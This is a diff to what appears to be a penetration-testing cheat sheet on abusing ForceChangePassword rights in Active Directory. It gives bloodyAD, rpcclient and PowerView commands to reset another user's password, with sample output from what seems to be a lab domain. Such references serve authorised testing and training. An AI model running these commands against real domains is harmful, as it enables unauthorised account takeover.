@@ -6,16 +6,17 @@ tags: ["Forcechangepassword", "Powerview", "Active Directory", "Windows", "blood
 
 ### Change target user password (From Linux)
 
-{{< tab set1 tab1 active >}}BloodyAD{{< /tab >}}
+{{< tab set1 tab1 >}}BloodyAD{{< /tab >}}
 {{< tab set1 tab2 >}}rpcclient{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
-python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
+# Pass password or :hash into PASSWORD
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
+bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
 [+] Password changed successfully!
 ```
 
@@ -36,7 +37,7 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 
 ### Change target user password (From Windows)
 
-{{< tab set2 tab1 active >}}Windows{{< /tab >}}
+{{< tab set2 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 #### 1. Import PowerView
@@ -49,10 +50,24 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Change Target User Password
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
+$username = '<DOMAIN>\<USER>'
+```
+
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+```
+
+```console
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
+```
+
+#### 3. Change Target User Password
+
+```console
+$password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
 ```
 
 ```console {class=sample-code}
@@ -60,7 +75,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
 ```console
-Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
+Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password -Credential $Cred
 ```
 
 ```console {class=sample-code}
